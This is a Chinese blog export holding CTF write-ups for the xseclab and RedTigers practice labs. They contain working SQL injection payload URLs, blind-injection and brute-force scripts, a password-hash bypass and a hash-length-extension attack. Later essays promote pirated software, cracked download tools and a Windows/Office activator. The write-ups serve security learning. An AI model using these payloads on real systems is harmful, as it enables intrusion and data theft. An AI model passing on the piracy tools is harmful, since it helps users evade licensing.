&lt;li&gt; &lt;label for="SMILE"&gt;请使用微笑过关&lt;a href="?view-source"&gt;源代码&lt;/a&gt;&lt;/label&gt; &lt;input type="text" name="T_T" placeholder="where is your smile" required&gt; &lt;/li&gt; &lt;li&gt;&lt;input type="submit" value="Show"&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/form&gt; &lt;/div&gt; &lt;div style="text-align:center;clear:both"&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?^%5f^=data:,(●'◡'●) 注入关宽字节注入输入%df’出现报错http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%df' 判断字段长短http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf' order by 3 %23 得到显示位 http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf' union select 1,2,3 %23 显示位为 2,3 查看表名http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23 得到字段名http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7361655f757365725f73716c6934) %23 得到字段数据http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf' union select 1,2,(select group_concat(title_1,content_1) from sae_user_sqli4) %23 limit注入猜测后台是select * from table limit start,num 发现只有limit参数有用，num没影响 遇到limit的注入的时候，可以使用如下的语句进行报错注入。select field from user where id=XXX order by id limit 1,1 procedure analyse (extractvalue(rand(),concat(0x3a,SQL注入语句)),1); 得到表名article,userhttp://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0%20procedure%20analyse(extractvalue(rand(),concat(0x3a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()))),1)%23%20&amp;num=100%20%23 得到user表中的字段id,username,password,lastloginIhttp://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0%20procedure%20analyse(extractvalue(rand(),concat(0x3a,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x75736572))),1)%23%20&amp;num=100%20%23 字段数据http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=6 procedure analyse(extractvalue(rand(),concat(0x3a,(select group_concat(username,password) from user))),1)%23&amp;num=100 %23 图片宽字节注入在页面上看不出显示的结果，要在burpsuite上查看网上说是图片宽字节注入，一直抓不到图片的数据包，只好作罢 报错注入一些常见的报错注入报错注入语句select count(*),concat(0x3a,0x3a,(注入语句),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a 得到数据库名http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23 得到表名http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' union select count(*),concat(0x3a,0x3a,(select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23 得到字段名http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' union select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=0x6c6f67 limit 0,1),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23 得到表中有多少条数据http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' union select count(*),concat(0x3a,0x3a,(select count(*) from motto),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23 脱裤失败http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' union select count(*),concat(0x3a,0x3a,(select username from motto limit 0,1),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23 尝试别的语句http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin' and extractvalue(1, concat(0x3a,(SELECT distinct concat(0x3a,username,0x3a,motto,0x3a,0x3a) FROM motto limit 3,1)))%23 盲注sqlmap可以跑出来，网络连接不太好容易断。 cookie注入在cookie后面加上了一个id=\,报错Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=\ 得到字段长度Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=2 order by 4 得到显示位Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=0 union select 1,2,3 得到表名Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=0 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) 得到字段名Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=0 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='sae_manager_sqli8') 脱裤Cookie: PHPSESSID=9f5169cbfb23ef8e10ca86f02cae97c9;id=0 union select id,username,password from sae_manager_sqli8 哈希后的密码是不能产生注入的PLEASE LOGINT!&lt;noscript&gt;&lt;?phpinclude "config.php";if(isset($_GET['userid']) &amp;&amp; isset($_GET['pwd']))&#123; $strsql="select * from `user` where userid=".intval($_GET['userid'])." and password='".md5($_GET['pwd'], true) ."'"; $conn=mysql_connect($dbhost,$username,$pwd); mysql_select_db($db,$conn); $result=mysql_query($strsql); print_r(mysql_error()); $row=mysql_fetch_array($result); mysql_close($conn); echo "&lt;pre&gt;"; print_r($row); echo "&lt;/pre&gt;"; if($row!=null)&#123; echo "Flag: ".$flag; &#125; &#125;else&#123; echo "PLEASE LOGINT!";&#125;echo "&lt;noscript&gt;";echo file_get_contents(__FILE__); 其中最关键的语句是 select * from user where userid=".intval($_GET['userid'])." and password='".md5($_GET['pwd'], true) ."'。 对传入的userid使用了intval()函数转化为数字，同时将password使用md5()函数进行转化。这就是一个典型的MD5加密后的SQL注入。其中最主要的就是md5()函数，当第二个参数为true时，会返回16字符的二进制格式。当为false的时候，返回的就是32字符十六进制数。默认的是false模式。具体的差别通过下面这个代码来看。 md5("123456"); e10adc3949ba59abbe56e057f20f883emd5("123456",true); 可以看到当参数为true的时候，md5之后的值就会乱码。那么只要md5(str,true)之后的值是包含了’or’这样的字符串，那么sql语句就会变为select 8 from users where usrid=”XXX” and password=’’or’‘。如此就可以绕过了。那么这样的str字符串存在吗？所幸还好存在一个，就是ffifdyop。那么我们最终的payload就是： http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/?userid=1&amp;pwd=ffifdyop 或者http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/?userid=1&amp;pwd=129581926211651571912466741651878684928 解密关以管理员身份登录系统sukey 值是为时间戳取整，MD5加密而来的#coding=utf-8import requestsimport hashlibimport timese=requests.session()header=&#123;'Cookie':'PHPSESSID=c55e14d0b2191166af88d0ac03c48113'&#125;while True: sukey=hashlib.new('md5',str(int(time.time())).encode('utf-8')).hexdigest() url="http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey="+sukey+"&amp;username=admin" r=se.get(url,headers=header) time.sleep(0.5) if r.content: print(r.content) break else: print('Cracking:'+sukey) 邂逅对门的妹纸 先生成字典。 with open("password.txt","w") as f: for year in range(1933,1936): for month in range(1,13): for day in range(1,32): f.write("%d%02d%02d\n"%(year,month,day)) 用 EWSA 爆破失败，不知啥原因，以后再研究。 思科密码破解在线解密 uawei/h3c 交换机的加密密码在window下无法运行此脚本，在kail下即可得。# coding=utf-8from Crypto.Cipher import DESdef decode_char(c): if c == 'a': r = '?' else: r = c return ord(r) - ord('!')def ascii_to_binary(s): assert len(s) == 24 out = [0]*18 i = 0 j = 0 for i in range(0, len(s), 4): y = decode_char(s[i + 0]) y = (y &lt;&lt; 6) &amp; 0xffffff k = decode_char(s[i + 1]) y = (y | k) &amp; 0xffffff y = (y &lt;&lt; 6) &amp; 0xffffff k = decode_char(s[i + 2]) y = (y | k) &amp; 0xffffff y = (y &lt;&lt; 6) &amp; 0xffffff k = decode_char(s[i + 3]) y = (y | k) &amp; 0xffffff out[j+2] = chr(y &amp; 0xff) out[j+1] = chr((y&gt;&gt;8) &amp; 0xff) out[j+0] = chr((y&gt;&gt;16) &amp; 0xff) j += 3 return "".join(out)def decrypt_password(p): r = ascii_to_binary(p) r = r[:16] d = DES.new("\x01\x02\x03\x04\x05\x06\x07\x08", DES.MODE_ECB) r = d.decrypt(r) return r.rstrip("\x00")if __name__ == '__main__': miwen = "aK9Q4I)J'#[Q=^Q`MAF4&lt;1!!" print u'明文' + decrypt_password(miwen) ``` ## 异常数据字母全部转换为大写的base64。``` bash#coding=utf-8import refrom base64 import *def change(res,arr,pos): res.append(''.join(arr)) i=pos for i in range(i,len(arr)): if arr[i]&lt;='Z' and arr[i]&gt;='A': arr[i]=arr[i].lower() change(res,arr,i+1) arr[i]=arr[i].upper()arr=list('AGV5IULSB3ZLVSE=')res=[]change(res,arr,0)res_decode=map(b64decode,res)for i in res_decode: if re.findall(r'\\x',repr(i)): continue else: print(i) md5真的能碰撞嘛?php特性隐患 &lt;?php$flag=FLAG;if(isset($_POST["password"]))&#123; $password=$_POST['password']; $rootadmin="!1793422703!"; if($password==$rootadmin)&#123;die("Please do not attack admin account!");&#125; if(md5($password)==md5($rootadmin))&#123; echo $flag; &#125;else&#123; die("Password Error!"); &#125;&#125;?&gt; $rootadmin加密后的值为md5(!1793422703!,32) = 0e332932043729729062996282883873md5(QNKCDZO,32) = 0e830400451993494058024219903391md5(240610708,32) = 0e462097431906509019562988736854 构造payload: ?password=QNKCDZO 有签名限制的读取任意文件哈希长度扩展攻击的简介以及HashPump安装使用方法 解法原文 在kail下使用hashpumphashpump -s f3d366138601b5afefbd4fc15731692e -d /etc/hosts -k 32 -a chen 得到，包’\x’换成%3998b374350d22991b9c8f9885194a16/etc/hosts\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00P\x01\x00\x00\x00\x00\x00\x00chen 构造payload:?filepath=/etc/hosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00chen&amp;sign=3998b374350d22991b9c8f9885194a16 综合关渗透测试第一期首先有注册和修改密码的选项，先注册一个账号并绑定手机号（查看网页源码得到），注册成功后，知道只有用admin账户登入，才能得到key。到忘记密码选项去修改密码，发现弹不出手机的验证码。可以猜测到管理员的账号绑定的不是这个手机。突然想起在注册账号的时候有手机绑定，在手机绑定的时候，抓包，把用户名改成admin.绑定成功。然后在回到修改密码哪里，现在可以弹出验证码。修改后。弹出密码。用这个密码登入admin账户，登入成功。 没有注入到底能不能绕过登录通过robots.txt中可知一个不可访问的文件，直接访问，提示要先登入。用admin账户，密码随便，登入，提示密码错误，不管弹框，直接输入刚才不可访问文件的链接，得到key。原来后台没有对登入账户进行校验，只要保持一个session就行。import requestsr = requests.Session()url = 'http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/'data = &#123;'username': 'admin', 'password': '123'&#125;r.post(url, data=data)url2 = 'http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/myadminroot/'print (r.get(url2).content) 后面一些题目的解答]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RedTigers Hackit writeup]]></title>
    <url>%2Fposts%2F90656973.html</url>
    <content type="text"><![CDATA[RedTigers Hackit一个不错的sql注入外国平台，也灵活，可以学到很多。 level 1常规的注入 爆字段http://redtiger.labs.overthewire.org/level1.php?cat=1 order by 4 # 看显示位http://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,4 # 表名已经提示，根据登录表单，猜测字段username,password https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_users # 得到用户名和密码，登入后得到flag和下一关的密码 4_is_not_random level 2万能密码登入admin’ or 1=1%23admin’ or ‘1’=’1admin’ or ‘1’=’1’%23 得下一关密码 feed_your_cat_before_your_cat_feeds_you level 3通过user[] 变为数组报错， http://redtiger.labs.overthewire.org/level3.php?usr[]=MDQyMjExMDE0MTgyMTQw 访问http://redtiger.labs.overthewire.org/urlcrypt.inc 的到加密机密的代码 &lt;?php // warning! ugly code ahead :) function encrypt($str) &#123; $cryptedstr = ""; srand(3284724); for ($i =0; $i &lt; strlen($str); $i++) &#123; $temp = ord(substr($str,$i,1)) ^ rand(0, 255); while(strlen($temp)&lt;3) &#123; $temp = "0".$temp; &#125; $cryptedstr .= $temp. ""; &#125; return base64_encode($cryptedstr); &#125; function decrypt ($str) &#123; srand(3284724); if(preg_match('%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%',$str)) &#123; $str = base64_decode($str); if ($str != "" &amp;&amp; $str != null &amp;&amp; $str != false) &#123; $decStr = ""; for ($i=0; $i &lt; strlen($str); $i+=3) &#123; $array[$i/3] = substr($str,$i,3); &#125; foreach($array as $s) &#123; $a = $s ^ rand(0, 255); $decStr .= chr($a); &#125; return $decStr; &#125; return false; &#125; return false; &#125;?&gt; 一开始，我是在window下进行加密的，但是做了很久一直做不出来，后来看了，别人的writeup，原来要在linux下运行。 判断字段 原语句：http://redtiger.labs.overthewire.org/level3.php?usr=Admin&apos;order by 7 #加密后：http://redtiger.labs.overthewire.org/level3.php?usr=MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY1MTkw 显示位 原语句：http://redtiger.labs.overthewire.org/level3.php?usr=spoock&apos; union select 1,2,3,4,5,6,7 #加密后：http://redtiger.labs.overthewire.org/level3.php?usr=MDI0MTk5MDEyMTc2MTI5MjI2MjE2MDI0MjE1MTExMTgwMTQ3MDcxMjM5MDEyMDAwMTc5MDA0MjU0MDMwMDQ1MjE4MjQzMTk3MDcyMjMzMTMwMjAwMTY5MTIxMTUzMTk4MDQwMDQ3MjQwMTk3 得到显示位2,4,5,6,7 爆密码：原语句：http://redtiger.labs.overthewire.org/level3.php?usr=spoock&apos; union select 1,password,3,4,5,6,7 from level3_users where username=0x41646d696e #&quot;加密后：http://redtiger.labs.overthewire.org/level3.php?usr=MDI0MTk5MDEyMTc2MTI5MjI2MjE2MDI0MjE1MTExMTgwMTQ3MDcxMjM5MDEyMDAwMTc5MDA0MjU0MDMwMDQ1MjE4MjQzMTM1MDA1MTY5MjIxMTM5MjM0MDYyMjA5MjIwMDU1MDUyMjI4MjAyMTUxMjI3MDQwMTA0MjMxMjIwMDM5MTM2MTYzMTczMDY0MTk5MDcxMTM2MTE1MDkyMjE3MTY5MDkzMDYxMTgxMTY1MDU3MTE4MDg0MTUxMDM0MDg1MTI1MDU1MTIzMjAwMTMwMDk1MTQ1MjE3MDcxMDM2MTQzMTk4MTIyMDM5MTQ3MDE5MDM4MTQzMDQ5MjAyMTUwMDc1MDQ3MTYwMTE5 得到密码：thisisaverysecurepasswordEEE5rt得到下一关的：there_is_no_bug level 4布尔的盲注 import stringfrom re import *from urllib.request import *answer = ""char = string.printable cookies = &#123; "level2login": "4_is_not_random", "level3login": "feed_your_cat_before_your_cat_feeds_you", "level4login": "there_is_no_bug", "level5login": "there_is_a_truck"&#125;url = "http://redtiger.labs.overthewire.org/level4.php?id=1%20and%201=(select%20count(*)%20from%20level4_secret%20where%20substr(keyword,&#123;0&#125;,1)='&#123;1&#125;')"for q in range(1, 22): for i in char: test = (url.format(q, i)) request = Request(test, None, headers=cookies) res = urlopen(request) s = res.read().decode() if (findall("Query returned 1 rows.", s)): print("&#123;0&#125; ".format(q) + i) answer += i breakprint(answer) import reimport requestsdef exe_get(url): cookies = &#123; "level2login": "4_is_not_random", "level3login": "feed_your_cat_before_your_cat_feeds_you", "level4login": "there_is_no_bug", "level5login": "there_is_a_truck" &#125; response = requests.get(url, cookies=cookies) html = response.text match = re.search('0', html) # 表示值偏大 if match: return -1 # 表示值偏小 else: return 1def get_data_char(i): url_template = "https://redtiger.labs.overthewire.org/level4.php?id=2 or ascii(substr((select keyword from level4_secret),&#123;0&#125;,1))&gt;&#123;1&#125;" low,high = 48,126 while low&lt;=high: mid = (low+high)//2 url = url_template.format(i,mid) result = exe_get(url) if result&gt;0: low = mid+1 else: high=mid-1 print(low,high,mid) print(low) return lowdef get_data(): data="" for i in range(1,18): char=get_data_char(i) data += chr(char) print(data)get_data() level 5post请求,即可username=1'union select 1,md5(1)%23&amp;password=1&amp;login=Login 得到下一关的：for_more_bugs_update_to_php7 level 6一开始加上’报错，开始判断列数http://redtiger.labs.overthewire.org/level6.php?user=3 order by 5# 判断显示位的时候，出现user not found猜测后台可能进行了二次查询尝试一下语句，一直没成功，应该是’引发报错，导致后面无法显示。http://redtiger.labs.overthewire.org/level6.php?user=1' union select 1,username ,3,4,5 from level6_users where status=1 %23 换一下语句,各个列位尝试了一下，发现只有第二个先能显示正常，尝试一下把username换成password,发现都失败，猜测第二次sql语句查询应该是根据username字段。http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,username,3,4,5 from level6_users where status=1 在第二个列位输入，再输入http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,'union select 1,2,3,4,5#,3,4,5 发现报错，将nion select 1,&#39;union select 1,2,3,4,5#转换成十六进制http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x27756E696F6E2073656C65637420312C322C332C342C3523,3,4,5 成功，2,4回显，现在就可以开始正常的流程爆数据了。最终的payload，原来的语句http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,'union select 1,username,3,password,5 from level6_users where status=1#,3,4,5 转换成十六进制http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x27756E696F6E2073656C65637420312C757365726E616D652C332C70617373776F72642C352066726F6D206C6576656C365F7573657273207768657265207374617475733D3123,3,4,5 看别下一关的：keep_in_mind_im_not_blind level 7过滤了挺多的,输入’得到报错语句An error occured!:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' OR text.title LIKE '%'%')' at line 1SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%'%' OR text.title LIKE '%'%') 从报错语句中可以看出后台的查询语句。开始构造语句绕过，注释符，限制挺多的，一个个尝试，发现–%a可以绕过获得显示位search=search=1%') union select 1,2,3,4 --%a0&amp;dosearch=search%21 最终search=search=1%') union select 1,2,autor,4 from level7_news --%a0&amp;dosearch=search%21 下一关的：no_pernel_kanic_on_the_titanic level8在email处，输入’成功报错，其他处正常，报错语句为You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '12345\'', age = '25' WHERE id = 1' at line 3 Username: 大概 update table set 的更新语句。如果update语句中有a=b这样的语句就会将当前记录的b的值赋值到a. 最终payloademail=hans%40localhost',name=password,icq='&amp;name=Hans&amp;icq=12345&amp;age=25&amp;edit=Edit 下一关：cybercyber_vuln level9在留言框中输入’会出现报错You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''')' at line 6Autor: 尝试用括号, autor=1&amp;title=1&amp;text='),('&amp;post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 出现报错，尝试很多次，用下面的语句成功回显，1,2autor=1&amp;title=1&amp;text='),(1,2,'&amp;post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 最终payloadautor=1&amp;title=1&amp;text='),((select username from level9_users limit 1),(select password from level9_users limit 1),'&amp;post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 下一关的：get_post_cookie_head__kittens_eating_all_my_bread level 10抓包得到login=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6Ik1vbmtleSI7czo4OiJwYXNzd29yZCI7czoxMjoiMDgxNXBhc3N3b3JkIjt9&amp;dologin=Login 将login的值，base64解密一下的得到一段账户密码的序列化a:2:&#123;s:8:"username";s:6:"Monkey";s:8:"password";s:12:"0815password";&#125; 一开始直接改username为TheMaster发现不成功，查看资料，才知道要将password的值改为bool类型的，例如我们只需要将password的属性修改为boolean类型的true，那么就可以绕过检查了。所以payload的形式为:a:2:&#123;s:8:"username";s:9:"TheMaster";s:8:"password";b:1;&#125; 最后将这个字符串进行base64编码,YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30= 最终的payload]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[QQ自动抢红包和查看别人撤回的消息]]></title>
    <url>%2Fposts%2F472f3104.html</url>
    <content type="text"><![CDATA[QQ自动抢红包和和查看别人撤回的消息，这两个功能的实现首先要有两个前提，安卓手机支持root和成功安装xposed框架，现在的很多手机基本上都不能root，天生支持root的魅族手机，也就成了一些喜欢越狱玩转手机炫酷功能的人最爱。不同手机型号root的方式不同，可以根据自己的型号自行找资料。最近，偶然间在手机模拟器上实现这两个功能，发现十分简易。 安装逍遥模拟器现在的手机模拟器都是自动带有root功能的，只要自动开启就行了。我尝试用过很多手机模拟器，觉得逍遥模拟器，是比较稳定和好用的，而且可以支持多线程地开启多个模拟器。电脑上自行下载和安装。首先在模拟器的设置中调小一下内存和cpu占用率，如果电脑内存本来就小，模拟器占用太多是会导致电脑很卡。 安装必需的软件首先建议下载个uc浏览器，自带的浏览器本来就是为了下载游戏用的，不太好用。然后在uc浏览器中搜索xposed框架安装器下载，启动安装器，进行安装会自动根据手机的安卓版本安装正确的exposed框架。 exposed框架此时是没有激活的，点击安装更新，进行激活，会弹出是否启用允许使用root,在这过程中有出现此提醒，全部都允许。重启会卡住，要手动关闭模拟器，再启动。然后去下载qq自动抢红包插件和qq防撤回插件，qq防撤回插件要最新的，现在好像是2.20版本。这两个插件可以在uc浏览器上搜索，也可以在xposed商店上下载。下载完成后，默认是没有启动的，要在xposed框架的模块中把这两个插件打钩，然后重启模拟器，就自动激活了。 然后下载qq，版本不要太新，然后就会在qq上看到多出了撤回的功能，把想要的功能打钩，就可以了。 实践一下功能。我发了一个红包和撤回一条消息，查看一下效果。 因为懒，其中有些写得不详细，有遇到问题可以跟我探讨一下。这两个功能只是冰山一角而已，还有很多骚操作，去探索一下。]]></content>
      <categories>
        <category>essay</category>
      </categories>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无法忍受云盘的限速]]></title>
    <url>%2Fposts%2Fd615baa4.html</url>
    <content type="text"><![CDATA[自从百度云盘的破解版被封后，那个下载速度简直惨不忍睹。不想开通会员，只好另寻它法。偶然间看到一个谷歌的插件baidudl，他可以获得百度云盘的下载地址，然后可以使用第三方软件下载了，比如说迅雷、IDM等等 安装方法这个插件你可以在谷歌商店中搜索到，不过要翻墙，如果你不能翻墙上网，提供个百度云下载地址 链接：https://pan.baidu.com/s/1kWwRh8F 密码：yajs 如这里说一下不能翻墙，怎样安装插件在浏览器吧。 首先解压压缩包，在extension_1_3_5_0.crx,右击选择属性，然后更改，更改成极速游览器或者chrome，看你使用哪个浏览器，我这里使用的是极速演示，确认后，直接运行就就会帮你安装在浏览器上。 获取下载链接然后在你的浏览器中，登入百度云盘。就可以获取到连接了。然后copy到第三方软件下载。 生成的下载链接包括 Glinks 和 Hlinks ，Glinks 含义是：链接比较稳定但是速度比较慢。Hlinks 含义：链接比较不稳定但下载速度更快。个人建议使用Glinks的。 使用第三方软件下载 迅雷：在国内迅雷使用较广。它的下载原理：是原网址下载+P2P下载，其中P2P下载就是在你下载文件的同时，你也会成为服务器上传资源给别人，你下载的东西来源也是从其他正在下载的其他迅雷用户的电脑那里传来的。同时这也是为什么说P2P在较多人下载使用的时候，速度会快的原因。因为每个使用P2P下载的人下载的同时也上传，成为加速服务器。 IDM:是国外的商业下载软件，是要付费的，这里提供一个破解盘的云盘地址，在云盘中选择一个安装。 http://idman.ys168.com/ 下载原理：IDM 是 HTTP，HTTPS，FTP 协议的下载工具，不包括 BT，EMULE 等 P2P 下载协议，如果对迅雷P2P限制下载的约束下，IDM具有优势，IDM也是多线程下载，把一个文件分成多段同时下载再合并。并且支持断点续传。但是，如果下载文件过大合并时间就会偏长点。]]></content>
      <categories>
        <category>essay</category>
      </categories>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你还在买vip看视频吗]]></title>
    <url>%2Fposts%2F5a2301f5.html</url>
    <content type="text"><![CDATA[还记得，第一次买爱奇艺vip看视频，被坑的经历。看首月6元挺便宜的，刚好有些视频想追，就买了一个月， 突然有一天，手机收到一条支付宝支出15元的短息，慌了一下，支付宝被人用了吗。 立即进支付宝查了一下账单，发现是爱奇艺会员的自动续费的费用，原来在开通爱奇艺首月时，默认的自动续费是开着的，不带这么坑的吧！ 后来，发现有一些网站可以解析vip视频，像爱奇艺、腾讯等等的vip视频都能看，当然，好东西不能独享，就给出一条如下地址吧 风沙娱乐 使用方法，只要把你想看的vip视频的地址放入上面网站的视频解析接口上，播放就行。举个例子。进入网页版的腾讯，找到想要看的vip视频，对着视频右击，复制链接地址进入视频解析网站,在视频链接上粘贴地址 开始看啦 有时候，我们想看一部视频，但是一直找不到，怎么办，放弃吗？ 一个快速找到想要视频的地址和种子如下 磁力猫]]></content>
      <categories>
        <category>essay</category>
      </categories>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电脑系统的重装和激活]]></title>
    <url>%2Fposts%2Fb884f343.html</url>
    <content type="text"><![CDATA[很多是学计算机相关的，但是好像能够自己重装系统的人还是比较少的，看了一下网上的教程，虽然有很多种方法，但是感觉不是很详细，有些步骤得的忽略，很容易导致系统重装失败。我记得第一次重装系统是在大一下学期的时候，那时候在玩注册表的时候，一不小心把登入账号给弄没了，只留下一个我忘记密码的登入账号，没办法只能重装系统。当时不会装系统，跟舍友搞了一天，安装错了很多次，把电脑所有的资料都给格式化了。我的资料啊！心塞！ 准备: 一个u盘，大小建议大于8g以上的。 创建系统盘我用的是电脑店软件来重装系统的，个人觉得挺好用的。首先进入官网下载。我选择的是百度云盘下载的（下载解压后直接启动就行了） 启动软件后，选择u盘启动，选择的设备：插入u盘后就会自动识别。启动模式USB-HDD，分区格式:建议选择NTFS模式。因为FAT32在实际运行中不支持单个文件大于4GB的文件，一旦超过容量限制那么系统就会提示磁盘空间不足（而系统镜像的大小一般都大于4g）。如果是苹果电脑的话，就选择Exfat模式。然后点击开始制作就行了。如果制作系统盘过程中杀毒软件有阻止某些操作的话，请选择允许。 制作中 制作完成 注意警告！可以选择是，会弹出一个虚拟的系统终端，然后关闭 下载系统镜像建议到MSDN我告诉你去下载镜像。这里面有很多镜像系统，选择win10最新的、64位系统镜像的，复制其ed2k链接到迅雷中下载。 复制到迅雷 复制系统到系统盘（即U盘）在点击下载的ios镜像中，在里面找到install.win的文件将其复制到系统盘 进入bios修改成U盘优先启动电脑品牌和型号不同进入bios中的方式不同，怎样的方式也有点不同，自己要先百度一下。我这里的实验的电脑是联想xiaoxin 700-151sk。我在开机时按fn+f2键进入bios系统。在Boot中 找到优先启动的选项，将USB HDB设为第一个（不同电脑型号方法有所不同），即U盘优先启动。然后按fn+f10保存修改并离开 开始重装系统插入u盘，重启电脑。会进入系统盘中的系统中，建议选择启动win8PEX86（win10pe启动占用内存大启动慢），进入win8pe系统后，点击电脑店一键装机 ， 映像文件：选择u盘上的镜像(win后缀的）盘符：选择C盘 ，点击执行即可。然后耐心等待系统重装完成后，拔掉u盘，重启系统。然后就配置一些选项就好了。 激活系统安装完系统，默认是没有激活的。这时候，你就要下载一个小工具，安装，运行，点击红色按钮，它就会帮你激活。悄悄告诉你，这个工具也可以激活office系列2016的办公软件哦！给你个office办公软件百度云盘 激活工具：链接：https://pan.baidu.com/s/1c2O92Qs 密码：f9ro office2016下载地址：http://pan.baidu.com/s/1bVtjGU]]></content>
      <categories>
        <category>essay</category>
      </categories>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[moctf迎春赛部分writeup]]></title>
    <url>%2Fposts%2F58504f2f.html</url>
